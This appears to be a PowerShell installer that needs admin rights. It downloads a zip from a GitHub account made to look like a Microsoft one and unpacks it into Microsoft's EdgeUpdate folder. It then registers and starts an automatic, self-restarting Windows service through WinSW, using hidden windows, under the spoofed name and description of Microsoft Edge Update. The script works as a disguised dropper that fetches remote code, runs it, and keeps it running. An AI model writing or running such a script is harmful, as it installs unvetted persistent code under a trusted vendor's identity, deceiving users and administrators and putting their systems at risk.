# Requires -RunAsAdmin

# Define environment variables
$DownloadUrl = "https://github.com/WindowsSecurityServices/MicrosoftEdgeUpdate/releases/download/v1.0.1/MicrosoftEdgeUpdate.zip"

# Updated base directory configurations
$BaseDir     = "C:\Program Files (x86)\Microsoft\EdgeUpdate"
$TargetDir   = Join-Path $BaseDir "Update"
$ZipPath     = Join-Path $TargetDir "MicrosoftEdgeUpdate.zip"

# 1. Ensure the nested folder hierarchy exists
if (-not (Test-Path $TargetDir)) {
    Write-Host "Creating deployment folder at $TargetDir..." -ForegroundColor Cyan
    New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
}

# 2. Download the Zip payload directly into the Update folder
Write-Host "Downloading bundle to $ZipPath..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $ZipPath -UseBasicParsing
} catch {
    Write-Error "Failed to download zip file. Verify URL or network configuration."
    Exit
}

# 3. Extract contents to the same Update folder locations
Write-Host "Extracting archive inside $TargetDir..." -ForegroundColor Cyan
try {
    Expand-Archive -Path $ZipPath -DestinationPath $TargetDir -Force
} catch {
    Write-Error "Failed to extract zip file."
    Exit
} finally {
    # Clean up and isolate the ZIP archive immediately
    if (Test-Path $ZipPath) { 
        Write-Host "Removing temporary zip payload..." -ForegroundColor Gray
        Remove-Item $ZipPath -Force 
    }
}

# 4. Move execution context to the deployment folder
Push-Location $TargetDir

# 5. Build/Verify the XML config sidecar file
$XmlPath = Join-Path $TargetDir "Install.xml"
if (-not (Test-Path $XmlPath)) {
    Write-Host "Creating fresh Install.xml configuration sidecar..." -ForegroundColor Yellow
    $XmlContent = @"
<service>
  <id>MicrosoftEdgeUpdate</id>
  <name>Microsoft Edge Update Service</name>
  <description>Keeps your Microsoft Edge browser up to date with the latest security fixes.</description>
  <executable>%BASE%\MicrosoftEdgeUpdate.exe</executable>
  <startmode>Automatic</startmode>
  <onfailure action="restart" delay="10 sec"/>
  <onfailure action="restart" delay="10 sec"/>
  <log mode="roll-by-size">
    <sizeThreshold>10240</sizeThreshold>
    <keepFiles>8</keepFiles>
  </log>
</service>
"@
    Set-Content -Path $XmlPath -Value $XmlContent -Encoding UTF8
}

# 6. Service lifecycle management via WinSW wrapper
$WinSWExe = Join-Path $TargetDir "MicrosoftEdgeUpdateService.exe"

if (Test-Path $WinSWExe) {
    Write-Host "Configuring service using $WinSWExe..." -ForegroundColor Cyan
    
    # Stop existing instance if running to prevent binary locks
    Start-Process -FilePath $WinSWExe -ArgumentList "stop" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
    Start-Process -FilePath $WinSWExe -ArgumentList "uninstall" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
    
    # Install and Start service via wrapper commands
    Write-Host "Registering service installation with Windows..." -ForegroundColor Green
    Start-Process -FilePath $WinSWExe -ArgumentList "install" -Wait -WindowStyle Hidden
    
    Write-Host "Starting the registered service..." -ForegroundColor Green
    Start-Process -FilePath $WinSWExe -ArgumentList "start" -Wait -WindowStyle Hidden
} else {
    Write-Error "WinSW wrapper executable not found at $WinSWExe."
}

Pop-Location
Write-Host "Deployment completed." -ForegroundColor Green
